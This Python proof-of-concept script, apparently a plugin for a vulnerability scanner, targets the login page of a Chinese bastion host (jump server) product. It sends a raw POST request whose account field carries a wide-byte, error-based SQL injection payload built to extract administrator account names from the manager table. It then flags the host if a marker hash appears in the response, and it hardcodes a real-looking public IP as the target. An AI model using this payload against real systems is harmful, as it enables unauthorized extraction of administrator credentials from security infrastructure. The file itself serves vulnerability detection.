#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  江南科友堡垒机注入
Author    :  a
mail      :  a@lcx.cc
refer     :   wooyun-2014-077033
"""
import urlparse

def assign(service, arg):
    if service == 'hac_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    #命令执行1
    path='login.php'
    target = arg + path
    raw='''POST /login.php HTTP/1.1
Host: 192.168.10.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://123.124.158.72/login.php
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 238

password_check=1&account=aaa%cf'+and+exists(select*from+(select*from(select+name_const((select+concat(account,md5(123))+from+manager+limit+0,1),0))a+join+(select+name_const((select+concat(account,md5(123))+from+manager+limit+0,1),0))b)c)#'''
    code, head, res, errcode, _ = curl.curl2(target,raw=raw)
    if code==200 and '202cb962ac59075b964b07152d234b70' in res:
        security_hole(target)
        
if __name__ == '__main__': 
    from dummy import *
    audit(assign('hac_gateway','https://123.124.158.72/')[1])